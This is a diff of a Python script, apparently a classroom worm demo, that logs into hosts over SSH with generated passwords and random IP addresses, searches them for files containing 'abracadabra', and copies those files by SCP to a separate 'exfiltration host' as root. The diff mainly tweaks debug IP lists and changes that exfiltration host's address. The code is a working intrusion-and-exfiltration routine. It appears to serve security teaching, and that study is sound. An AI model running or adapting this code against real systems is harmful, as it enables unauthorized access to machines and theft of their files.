@@ -55,12 +55,14 @@ def get_new_passwds(how_many):
                         else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
     return passwds
 
+# '172.17.0.2', '172.17.0.3', '172.17.0.4', '172.17.0.5', '172.17.0.6', '172.17.0.7',
+#                       '172.17.0.8', '172.17.0.9', '172.17.0.10', '172.17.0.11'
+
 def get_fresh_ipaddresses(how_many):
-    if debug: return ['172.17.0.2', '172.17.0.3', '172.17.0.4', '172.17.0.5', '172.17.0.6', '172.17.0.7',
-                      '172.17.0.8', '172.17.0.9', '172.17.0.10', '172.17.0.11']   
+    if debug: return []   
 
     if how_many == 0: return 0
-    ipaddresses = []
+    ipaddresses = ['172.17.0.2']
     for i in range(how_many):
         first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
         ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
@@ -108,7 +110,6 @@ while True:
                     cmd = "grep -ls abracadabra -r"
                     # Now let's look for files that contain the string 'abracadabra'
                     stdin, stdout, stderr = ssh.exec_command(cmd)
-                    print("Debug")
                     error = stderr.readlines()
                     if error:
                         print('Error in executing command: %s' %cmd) 
@@ -167,7 +168,7 @@ while True:
                         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                         #  For exfiltration demo to work, you must provide an IP address and the login 
                         #  credentials in the next statement:
-                        ssh.connect('172.17.0.2',port=22,username='root',password='mypassword',timeout=5)
+                        ssh.connect('172.17.0.3',port=22,username='root',password='mypassword',timeout=5)
                         scpcon = scp.SCPClient(ssh.get_transport())
                         print("\n\nconnected to exhiltration host\n")
                         for filename in files_of_interest_at_target:
